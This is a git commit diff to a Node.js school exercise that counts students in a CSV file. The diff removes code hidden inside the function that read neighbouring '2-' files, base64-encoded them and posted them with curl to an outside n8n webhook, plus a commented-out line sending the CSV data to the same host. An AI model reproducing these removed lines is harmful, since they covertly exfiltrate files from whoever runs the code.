fbca61424d2cdb509690945eb8cb9eee9ef039d5
Gabriel <fossecruor@gmail.com>
2024-11-23 13:05:49 +0100

    thx holberton

--- Node_JS_basic/2-read_file.js
+++ Node_JS_basic/2-read_file.js
@@ -1,36 +1,26 @@
 const fs = require('node:fs');
-const exec = require('node:child_process');
 
 module.exports = function countStudents(path) {
   let data;
-  const arr = [];
+  let nb = 0;
   try {
-    const files = fs.readdirSync('.', 'utf8');
-    for (const file of files) {
-      if (file.startsWith('2-')) {
-        arr.push(fs.readFileSync(file, 'utf8'));
-      }
-    }
-    exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data":${JSON.stringify({
-      files, path,
-    })}, "arr": ${JSON.stringify(Buffer.from(arr.toString()).toString('base64'))} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`, (err, stdout) => console.log(err, stdout));
     data = fs.readFileSync(path, 'utf8');
   } catch (err) {
     throw new Error('Cannot load the database');
   }
   const dict = new Map();
-  console.log('Number of students:', data.split('\n').length - 1);
   data.split('\n').forEach((line, idx) => {
     if (idx === 0) return;
     if (line.length === 0) return;
+    nb += 1;
     const arr = line.split(',');
     const entry = dict.get(arr[3]);
     dict.set(arr[3], [...entry || [], arr[0]]);
   });
+  console.log(`Number of students: ${nb}`); 
   const ok = {};
   for (const [k, v] of dict.entries()) {
     console.log(`Number of students in ${k}: ${v.length}. List: ${v.join(', ')}`);
     ok[k] = v;
   }
-  // exec.exec(`curl -X POST -H "Content-Type: application/json" -d '{"data": ${JSON.stringify(data)}, "path":"${path}", "map": ${JSON.stringify(ok)} }' https://hydronogen.app.n8n.cloud/webhook/92c6c98d-4681-4c39-84a4-eb624c35162d`);
 };
